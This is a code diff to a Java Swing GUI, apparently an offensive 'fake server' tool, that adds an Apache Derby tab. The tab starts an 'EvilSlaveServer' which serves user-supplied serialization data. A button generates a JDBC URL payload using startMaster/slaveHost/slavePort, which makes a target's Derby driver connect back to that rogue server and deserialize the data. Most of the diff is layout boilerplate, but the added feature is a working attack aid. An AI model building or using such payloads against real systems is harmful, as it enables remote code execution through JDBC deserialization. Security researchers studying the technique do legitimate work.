@@ -3,6 +3,7 @@ package me.n1ar4.fake.gui.form;
 import com.intellij.uiDesigner.core.GridConstraints;
 import com.intellij.uiDesigner.core.GridLayoutManager;
 import com.intellij.uiDesigner.core.Spacer;
+import me.n1ar4.derby.EvilSlaveServer;
 import me.n1ar4.fake.gui.Constant;
 import me.n1ar4.fake.gui.util.PortUtil;
 import me.n1ar4.fake.gui.util.StringUtil;
@@ -111,6 +112,32 @@ public class FakeServer {
     private JScrollPane pgPayloadScroll;
     private JLabel pgCmdLabel;
     private JTextField pgCmdText;
+    private JPanel derbyPanel;
+    private JTextArea dbSerDataArea;
+    private JPanel dbPanel;
+    private JPanel dbStatusPanel;
+    private JPanel dbAddrPanel;
+    private JPanel dbSerPanel;
+    private JPanel dbPayloadPanel;
+    private JTextField dbIpText;
+    private JLabel dbIpLabel;
+    private JLabel dbPortLabel;
+    private JTextField dbPortText;
+    private JButton dbRanPortBtn;
+    private JButton dbUse0Btn;
+    private JLabel dbStatusLabel;
+    private JLabel dbStartStop;
+    private JPanel dbOpPanel;
+    private JButton dbStartBtn;
+    private JButton dbStopBtn;
+    private JLabel dbUrlLabel;
+    private JButton genDerbyPayloadBtn;
+    private JScrollPane dbPayScroll;
+    private JTextField dbUrlText;
+    private JScrollPane dbSerScroll;
+    private JTextArea dbPayArea;
+    private JLabel dbAddrLabel;
+    private JTextField dbAddrText;
 
     public static String generateRandomXmlString() {
         String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
@@ -131,8 +158,11 @@ public class FakeServer {
         LogUtil.setT(this.logArea);
         this.gadgetArea.setLineWrap(true);
         this.pgPayloadArea.setLineWrap(true);
+        this.dbSerDataArea.setLineWrap(true);
+        this.dbPayArea.setLineWrap(true);
         this.addrText.setText("ip:port");
         this.pgAddrText.setText("ip:port");
+        this.dbAddrText.setText("ip:port");
         this.deserButton.setSelected(true);
         this.cbButton.setSelected(true);
         this.serverStatusDiffInterceptorRadioButton.setSelected(true);
@@ -143,14 +173,68 @@ public class FakeServer {
         this.windowsRadioButton.setSelected(true);
         this.psStartStop.setText(Constant.STOP);
         this.psStartStop.setForeground(Color.RED);
+        this.dbStartStop.setText(Constant.STOP);
+        this.dbStartStop.setForeground(Color.RED);
         this.randomFreePortButton.addActionListener(e -> this.portText.setText(PortUtil.getFreePort()));
         this.pgRanPortBtn.addActionListener(e -> {
             String p = PortUtil.getFreePort();
             this.pgPortText.setText(p);
             pgAddrText.setText("127.0.0.1:" + p);
         });
+        this.dbRanPortBtn.addActionListener(e -> {
+            String p = PortUtil.getFreePort();
+            this.dbPortText.setText(p);
+            dbAddrText.setText("127.0.0.1:" + p);
+        });
         this.useLocalButton.addActionListener(e -> this.ipText.setText("0.0.0.0"));
         this.pgUse0Btn.addActionListener(e -> this.pgIpText.setText("0.0.0.0"));
+        this.dbUse0Btn.addActionListener(e -> this.dbIpText.setText("0.0.0.0"));
+        this.dbStartBtn.addActionListener(e -> {
+            String ip = dbIpText.getText();
+            String port = dbPortText.getText();
+            if (StringUtil.isNull(ip) || StringUtil.isNull(port)) {
+                TipUtil.error("ip or port is null");
+                return;
+            }
+            String baseData = dbSerDataArea.getText();
+            if (StringUtil.isNull(baseData)) {
+                TipUtil.error("serialization data is null");
+                return;
+            }
+            dbStartStop.setText(Constant.RUNNING);
+            dbStartStop.setForeground(Color.GREEN);
+            dbStartBtn.setEnabled(false);
+            dbStopBtn.setEnabled(true);
+            new Thread(() -> {
+                try {
+                    EvilSlaveServer.start(ip, Integer.parseInt(port), baseData);
+                } catch (Exception ex) {
+                    ex.printStackTrace();
+                    LogUtil.log(ex.toString());
+                }
+            }).start();
+            String addr = dbAddrText.getText();
+            @SuppressWarnings("all")
+            String finalStr = String.format("tcp://%s", addr);
+            dbUrlText.setText(finalStr);
+            LogUtil.log("start apache derby server");
+        });
+        this.dbStopBtn.addActionListener(e -> {
+            EvilSlaveServer.stop();
+            new Thread(() -> {
+                try {
+                    Socket socket = new Socket("127.0.0.1", EvilSlaveServer.getPort());
+                    socket.getOutputStream().write("test".getBytes());
+                    socket.close();
+                } catch (Exception ignored) {
+                }
+            }).start();
+            LogUtil.log("apache derby server stopped");
+            dbStartStop.setText(Constant.STOP);
+            dbStartStop.setForeground(Color.red);
+            dbStartBtn.setEnabled(true);
+            dbStopBtn.setEnabled(false);
+        });
         this.pgStartServerBtn.addActionListener(e -> {
             String ip = pgIpText.getText();
             String port = pgPortText.getText();
@@ -159,7 +243,6 @@ public class FakeServer {
                 TipUtil.error("ip or port or cmd is null");
                 return;
             }
-            LogUtil.setT(this.logArea);
             psStartStop.setText(Constant.RUNNING);
             psStartStop.setForeground(Color.GREEN);
             pgStartServerBtn.setEnabled(false);
@@ -183,8 +266,7 @@ public class FakeServer {
         });
         this.pgStopServerBtn.addActionListener(e -> {
             XmlServer.stop();
-            LogUtil.log("pgsql server server stopped");
-            LogUtil.setT(null);
+            LogUtil.log("pgsql server stopped");
             psStartStop.setText(Constant.STOP);
             psStartStop.setForeground(Color.red);
             pgStartServerBtn.setEnabled(true);
@@ -197,6 +279,14 @@ public class FakeServer {
                     pgUrlText.getText());
             pgPayloadArea.setText(fmt);
         });
+        genDerbyPayloadBtn.addActionListener(e -> {
+            String tempDb = generateRandomXmlString().substring(1, 6);
+            String temp = "(1) Create a new database: ";
+            temp = temp + tempDb + "\njdbc:derby:" + tempDb + ";create=true" + "\n";
+            temp = temp + "(2) Use payload: \n" + "jdbc:derby:" +
+                    tempDb + ";startMaster=true;slaveHost=127.0.0.1;slavePort=" + dbPortText.getText() + ";";
+            dbPayArea.setText(temp);
+        });
         this.startServerButton.addActionListener(e -> {
             String ip = ipText.getText();
             String port = portText.getText();
@@ -207,7 +297,6 @@ public class FakeServer {
             }
             MySQLServer.setIp(ip.trim());
             MySQLServer.setPort(Integer.parseInt(port.trim()));
-            LogUtil.setT(this.logArea);
             new Thread(MySQLServer::StartServer).start();
             statusResultLabel.setText(Constant.RUNNING);
             statusResultLabel.setForeground(Color.GREEN);
@@ -217,7 +306,6 @@ public class FakeServer {
         this.stopServerButton.addActionListener(e -> {
             MySQLServer.stop();
             LogUtil.log("mysql fake server stopped");
-            LogUtil.setT(null);
             new Thread(() -> {
                 try {
                     // 触发新循环
@@ -837,7 +925,7 @@ public class FakeServer {
         pgStatusPane.setBorder(BorderFactory.createTitledBorder(BorderFactory.createEmptyBorder(), "", TitledBorder.DEFAULT_JUSTIFICATION, TitledBorder.DEFAULT_POSITION, null, null));
         pgStatusLabel = new JLabel();
         pgStatusLabel.setText("Status: ");
-        pgStatusPane.add(pgStatusLabel, new GridConstraints(0, 0, 1, 2, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
+        pgStatusPane.add(pgStatusLabel, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
         psStartStop = new JLabel();
         psStartStop.setText("STOP");
         pgStatusPane.add(psStartStop, new GridConstraints(0, 2, 1, 2, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
@@ -899,6 +987,93 @@ public class FakeServer {
         pgUrlText = new JTextField();
         pgUrlText.setEditable(false);
         outputPanel.add(pgUrlText, new GridConstraints(0, 1, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
+        derbyPanel = new JPanel();
+        derbyPanel.setLayout(new GridLayoutManager(5, 2, new Insets(0, 0, 0, 0), -1, -1));
+        derbyPanel.setBackground(new Color(-1120294));
+        tabbedPanel.addTab("Apache Derby", derbyPanel);
+        dbPanel = new JPanel();
+        dbPanel.setLayout(new GridLayoutManager(2, 5, new Insets(10, 10, 10, 10), -1, -1));
+        dbPanel.setBackground(new Color(-1120293));
+        derbyPanel.add(dbPanel, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_NORTH, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, new Dimension(-1, 100), 0, false));
+        dbPanel.setBorder(BorderFactory.createTitledBorder(BorderFactory.createEmptyBorder(), "", TitledBorder.DEFAULT_JUSTIFICATION, TitledBorder.DEFAULT_POSITION, null, null));
+        dbIpText = new JTextField();
+        dbPanel.add(dbIpText, new GridConstraints(0, 1, 1, 3, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
+        dbIpLabel = new JLabel();
+        dbIpLabel.setText("Bind IP");
+        dbPanel.add(dbIpLabel, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
+        dbPortLabel = new JLabel();
+        dbPortLabel.setText("Bind Port");
+        dbPanel.add(dbPortLabel, new GridConstraints(1, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
+        dbPortText = new JTextField();
+        dbPanel.add(dbPortText, new GridConstraints(1, 1, 1, 3, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
+        dbRanPortBtn = new JButton();
+        dbRanPortBtn.setText("Random Free Port");
+        dbPanel.add(dbRanPortBtn, new GridConstraints(1, 4, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
+        dbUse0Btn = new JButton();
+        dbUse0Btn.setText("USE 0.0.0.0");
+        dbPanel.add(dbUse0Btn, new GridConstraints(0, 4, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
+        final Spacer spacer2 = new Spacer();
+        derbyPanel.add(spacer2, new GridConstraints(4, 0, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_VERTICAL, 1, GridConstraints.SIZEPOLICY_WANT_GROW, null, null, null, 0, false));
+        dbStatusPanel = new JPanel();
+        dbStatusPanel.setLayout(new GridLayoutManager(2, 4, new Insets(10, 10, 10, 10), -1, -1));
+        dbStatusPanel.setBackground(new Color(-1120293));
+        derbyPanel.add(dbStatusPanel, new GridConstraints(0, 1, 1, 1, GridConstraints.ANCHOR_NORTH, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, new Dimension(-1, 100), 0, false));
+        dbStatusPanel.setBorder(BorderFactory.createTitledBorder(BorderFactory.createEmptyBorder(), "", TitledBorder.DEFAULT_JUSTIFICATION, TitledBorder.DEFAULT_POSITION, null, null));
+        dbStatusLabel = new JLabel();
+        dbStatusLabel.setText("Status: ");
+        dbStatusPanel.add(dbStatusLabel, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
+        dbStartStop = new JLabel();
+        dbStartStop.setText("STOP");
+        dbStatusPanel.add(dbStartStop, new GridConstraints(0, 2, 1, 2, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
+        dbOpPanel = new JPanel();
+        dbOpPanel.setLayout(new GridLayoutManager(1, 2, new Insets(0, 0, 0, 0), -1, -1));
+        dbOpPanel.setBackground(new Color(-1120293));
+        dbStatusPanel.add(dbOpPanel, new GridConstraints(1, 0, 1, 4, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
+        dbStartBtn = new JButton();
+        dbStartBtn.setText("Start Server");
+        dbOpPanel.add(dbStartBtn, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, new Dimension(150, -1), new Dimension(150, -1), new Dimension(150, -1), 0, false));
+        dbStopBtn = new JButton();
+        dbStopBtn.setText("Stop Server");
+        dbOpPanel.add(dbStopBtn, new GridConstraints(0, 1, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, new Dimension(150, -1), new Dimension(150, -1), new Dimension(150, -1), 0, false));
+        dbAddrPanel = new JPanel();
+        dbAddrPanel.setLayout(new GridLayoutManager(1, 2, new Insets(0, 0, 0, 0), -1, -1));
+        dbAddrPanel.setBackground(new Color(-1120294));
+        derbyPanel.add(dbAddrPanel, new GridConstraints(1, 0, 1, 2, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
+        dbAddrLabel = new JLabel();
+        dbAddrLabel.setText("Address");
+        dbAddrPanel.add(dbAddrLabel, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
+        dbAddrText = new JTextField();
+        dbAddrText.setText("");
+        dbAddrPanel.add(dbAddrText, new GridConstraints(0, 1, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
+        dbPayloadPanel = new JPanel();
+        dbPayloadPanel.setLayout(new GridLayoutManager(2, 4, new Insets(0, 0, 0, 10), -1, -1));
+        dbPayloadPanel.setBackground(new Color(-1120294));
+        derbyPanel.add(dbPayloadPanel, new GridConstraints(3, 0, 1, 2, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
+        dbUrlLabel = new JLabel();
+        dbUrlLabel.setText("URL");
+        dbPayloadPanel.add(dbUrlLabel, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
+        genDerbyPayloadBtn = new JButton();
+        genDerbyPayloadBtn.setText("Generate Apache Derby Driver Payload");
+        dbPayloadPanel.add(genDerbyPayloadBtn, new GridConstraints(0, 3, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
+        dbPayScroll = new JScrollPane();
+        dbPayloadPanel.add(dbPayScroll, new GridConstraints(1, 0, 1, 4, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_WANT_GROW, new Dimension(-1, 250), new Dimension(-1, 250), new Dimension(-1, 250), 1, false));
+        dbPayArea = new JTextArea();
+        dbPayArea.setLineWrap(true);
+        dbPayScroll.setViewportView(dbPayArea);
+        dbUrlText = new JTextField();
+        dbUrlText.setEditable(false);
+        dbPayloadPanel.add(dbUrlText, new GridConstraints(0, 1, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
+        dbSerPanel = new JPanel();
+        dbSerPanel.setLayout(new GridLayoutManager(1, 1, new Insets(0, 0, 0, 0), -1, -1));
+        dbSerPanel.setBackground(new Color(-1120294));
+        derbyPanel.add(dbSerPanel, new GridConstraints(2, 0, 1, 2, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
+        dbSerScroll = new JScrollPane();
+        dbSerScroll.setBackground(new Color(-1120294));
+        dbSerPanel.add(dbSerScroll, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_WANT_GROW, new Dimension(-1, 100), new Dimension(-1, 100), new Dimension(-1, 100), 0, false));
+        dbSerScroll.setBorder(BorderFactory.createTitledBorder(null, "Serialization Data", TitledBorder.DEFAULT_JUSTIFICATION, TitledBorder.DEFAULT_POSITION, null, null));
+        dbSerDataArea = new JTextArea();
+        dbSerDataArea.setText("");
+        dbSerScroll.setViewportView(dbSerDataArea);
         logPanel = new JPanel();
         logPanel.setLayout(new GridLayoutManager(1, 1, new Insets(0, 0, 0, 0), -1, -1));
         logPanel.setBackground(new Color(-1120293));
